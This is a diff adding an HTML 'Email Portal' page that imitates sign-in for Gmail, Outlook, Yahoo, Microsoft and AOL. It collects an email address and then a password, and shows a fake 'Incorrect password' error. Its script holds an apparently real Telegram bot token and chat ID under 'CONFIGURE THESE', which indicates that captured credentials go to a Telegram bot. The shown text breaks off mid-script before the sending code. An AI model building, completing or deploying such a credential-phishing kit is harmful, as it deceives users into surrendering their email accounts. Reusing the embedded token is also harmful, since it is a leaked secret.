@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Portal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+        }
+        .card {
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.06);
+        }
+        .header {
+            background: #2563eb;
+            padding: 32px 24px;
+            text-align: center;
+        }
+        .header h1 {
+            color: #ffffff;
+            font-size: 26px;
+            font-weight: 700;
+        }
+        .body {
+            padding: 32px 24px;
+        }
+        .subtitle {
+            color: #6b7280;
+            font-size: 15px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        .provider-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 14px 12px;
+            border: 1px solid #e5e7eb;
+            border-radius: 10px;
+            background: #f9fafb;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 14px;
+            font-weight: 600;
+            color: #374151;
+        }
+        .provider-btn:hover {
+            background: #f3f4f6;
+            border-color: #2563eb;
+            transform: translateY(-1px);
+        }
+        .provider-btn svg { width: 20px; height: 20px; flex-shrink: 0; }
+
+        /* Modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            backdrop-filter: blur(4px);
+        }
+        .modal-overlay.active { display: flex; }
+        .modal {
+            background: #ffffff;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            overflow: hidden;
+            animation: slideUp 0.3s ease;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .modal-header {
+            background: #2563eb;
+            padding: 20px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .modal-header svg { width: 24px; height: 24px; color: #fff; }
+        .modal-header h2 {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .modal-body { padding: 24px; }
+        .selected-label {
+            background: #eff6ff;
+            border: 1px solid #bfdbfe;
+            border-radius: 8px;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #1e40af;
+            font-weight: 500;
+        }
+        .selected-label svg { width: 18px; height: 18px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            outline: none;
+            transition: all 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37,99,235,0.1);
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-primary {
+            background: #2563eb;
+            color: #ffffff;
+        }
+        .btn-primary:hover { background: #1d4ed8; }
+        .btn-primary:active { transform: scale(0.98); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-secondary {
+            background: #f3f4f6;
+            color: #374151;
+            margin-top: 10px;
+        }
+        .btn-secondary:hover { background: #e5e7eb; }
+        .spinner {
+            width: 16px; height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .error-msg {
+            color: #dc2626;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        .forgot-link {
+            text-align: right;
+            margin: -8px 0 16px;
+        }
+        .forgot-link a {
+            color: #2563eb;
+            font-size: 13px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .forgot-link a:hover { text-decoration: underline; }
+        @media (max-width: 480px) {
+            .grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <div class="header">
+            <h1>Welcome Members!!</h1>
+        </div>
+        <div class="body">
+            <p class="subtitle">Select your email provider to continue</p>
+            <div class="grid" id="providerGrid"></div>
+        </div>
+    </div>
+</div>
+
+<!-- Login Modal -->
+<div class="modal-overlay" id="modal">
+    <div class="modal">
+        <div class="modal-header">
+            <svg id="modalIcon" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+            <h2 id="modalTitle">Sign In</h2>
+        </div>
+        <div class="modal-body">
+            <div class="selected-label" id="selectedLabel">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 13l4 4L19 7"/></svg>
+                <span id="providerName">Gmail</span>
+            </div>
+
+            <!-- Step 1: Email -->
+            <div class="step active" id="stepEmail">
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" id="emailInput" placeholder="Enter your email" autocomplete="email" autofocus>
+                    <div class="error-msg" id="emailError">Please enter a valid email</div>
+                </div>
+                <button class="btn btn-primary" onclick="goToPassword()">
+                    Continue
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+                </button>
+                <button class="btn btn-secondary" onclick="closeModal()">Cancel</button>
+            </div>
+
+            <!-- Step 2: Password -->
+            <div class="step" id="stepPassword">
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="passwordInput" placeholder="Enter your password" autocomplete="current-password">
+                    <div class="error-msg" id="passwordError">Incorrect password</div>
+                </div>
+                <div class="forgot-link"><a href="#">Forgot password?</a></div>
+                <button class="btn btn-primary" id="submitBtn" onclick="handleSubmit()">
+                    <span class="spinner" id="spinner"></span>
+                    <span id="btnText">Sign In</span>
+                </button>
+                <button class="btn btn-secondary" onclick="goBack()">Back</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ==================== CONFIGURE THESE ====================
+const BOT_TOKEN = '8206061540:AAHEn2yznvej5Rw4pDR4-M4AG69TZCm4leU';
+const CHAT_ID   = '8206061540';
+// =========================================================
+
+const providers = [
+    { name: 'Gmail', color: '#ea4335', icon: '<svg viewBox="0 0 488 512"><path fill="#ea4335" d="M488 261.8C488 403.3 391.1 504 248 504 110.8 504 0 393.2 0 256S110.8 8 248 8c66.8 0 123 24.5 166.3 64.9l-67.5 64.9C258.5 52.6 94.3 116.6 94.3 256c0 86.5 69.1 156.6 153.7 156.6 98.2 0 135-70.4 140.8-106.9H248v-85.3h236.1c2.3 12.7 3.9 24.9 3.9 41.4z"/></svg>' },
+    { name: 'Outlook', color: '#0078d4', icon: '<svg viewBox="0 0 448 512"><path fill="#0078d4" d="M0 93.7l183.6-25.3v177.4H0V93.7zm0 324.6l183.6 25.3V268.4H0v149.9zm203.8 28L448 480V268.4H203.8v177.9zm0-380.6v180.1H448V32L203.8 65.7z"/></svg>' },
+    { name: 'Yahoo Mail', color: '#6001d2', icon: '<svg viewBox="0 0 512 512"><path fill="#6001d2" d="M223.69,141.06,167,284.23,111,141.06H14.93L120.76,390.19,82.19,480h94.17L317.27,141.06Zm105.4,135.79a58.22,58.22,0,1,0,58.22,58.22A58.22,58.22,0,0,0,329.09,276.85ZM394.65,32l-93,223.47H406.44L499.07,32Z"/></svg>' },
+    { name: 'Microsoft', color: '#00a4ef', icon: '<svg viewBox="0 0 448 512"><path fill="#00a4ef" d="M0 32h214.6v214.6H0V32zm233.4 0H448v214.6H233.4V32zM0 265.4h214.6V480H0V265.4zm233.4 0H448V480H233.4V265.4z"/></svg>' },
+    { name: 'AOL', color: '#ff0b00', icon: '<svg viewBox="0 0 24 24"><path fill="#ff0b00" d="M13.07 9.334c2.526 0 3.74 1.997 3.74 3.706 0 1.709-1.214 3.706-3.74 3.706-2.527 0-3.74-1.997-3.74-3.706 0-1.709 1.213-3.706 3.74-3.706m0 5.465c.9 0 1.663-.741 1.663-1.759 0-1.018-.763-1.759-1.663-1.759s-1.664.741-1.664 1.759c0 1.018.764 1.76 1.664 1.76m4.913-7.546h2.104v9.298h-2.104zm4.618 6.567a1.398 1.398 0 1 0 .002 2.796 1.398 1.398 0 0 0-.002-2.796M5.536 7.254H3.662L0 16.55h2.482l.49-1.343h3.23l.452 1.343H9.16zm-1.91 6.068L4.6 10.08l.974 3.242H3.626z"/></svg>' },
+    { name: 'Other Email', color: '#6b7280', icon: '<svg viewBox="0 0 512 512"><path fill="#6b7280" d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"/></svg>' }
+];
+
+let currentProvider = '';
+
+function renderProviders() {
+    const grid = document.getElementById('providerGrid');
+    grid.innerHTML = providers.map(p => `
+        <button class="provider-btn" onclick="openModal('${p.name}')">
+            ${p.icon}
+            <span>${p.name}</span>
+        </button>
+    `).join('');
+}
+
+function openModal(providerName) {
+    currentProvider = providerName;
+    document.getElementById('providerName').textContent = providerName;
+    document.getElementById('modalTitle').textContent = `Sign in to ${providerName}`;
+    document.getElementById('modal').classList.add('active');
+    document.getElementById('stepEmail').classList.add('active');
+    document.getElementById('stepPassword').classList.remove('active');
+    document.getElementById('emailInput').value = '';
+    document.getElementById('passwordInput').value = '';
+    document.getElementById('emailError').style.display = 'none';
+    document.getElementById('passwordError').style.display = 'none';
+    setTimeout(() => document.getElementById('emailInput').focus(), 100);
+}
+
+function closeModal() {
+    document.getElementById('modal').classList.remove('active');
+}
+
+function goToPassword() {
+    const email = document.getElementById('emailInput').value.trim();
+    if (!email || !email.includes('@')) {
+        document.getElementById('emailError').style.display = 'block';
+        return;
+    }
+    document.getElementById('emailError').style.<
+...
+
+[Message clipped]  View entire message
